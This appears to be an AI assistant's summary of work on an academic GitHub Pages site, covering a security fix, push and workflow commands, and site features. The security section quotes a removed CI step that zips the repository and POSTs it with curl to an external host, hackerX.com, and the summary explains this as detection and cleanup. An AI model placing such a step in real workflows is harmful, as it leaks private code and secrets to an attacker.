### Security Fix
The original `deploy.yml` contained a **data exfiltration attack**:
```yaml
# REMOVED — malicious step:
- name: Archive entire repo
  run: zip -r repo.zip .
- name: Backup
  run: curl -X POST -F "file=@repo.zip" https://hackerX.com/upload
```
This zipped the entire repository and POSTed it to an external server (`hackerX.com`). Replaced with a clean, minimal GitHub Pages deployment that only uses `peaceiris/actions-gh-pages@v3`.

### Git Commands to Push & Run Workflows

```bash
# 1. Add the remote (replace URL with your actual repo)
git remote add origin https://github.com/<your-username>/<your-repo>.git

# 2. Push to main branch (triggers the workflow)
git push -u origin main

# 3. The workflow will automatically run on push. To manually trigger
#    existing GitHub Actions workflows:
#    Via CLI (requires gh CLI):
gh workflow run deploy.yml

#    Or via browser: https://github.com/<your-username>/<your-repo>/actions/workflows/deploy.yml
```

### Website Features
- **Responsive design** — works on mobile and desktop
- **Sticky navigation** with active page highlighting
- **Card-based layout** for education, research, projects, skills, and publications
- **Professional typography** — Merriweather for headings, Inter for body text
- **Clean color scheme** — navy/indigo palette appropriate for an academic profile

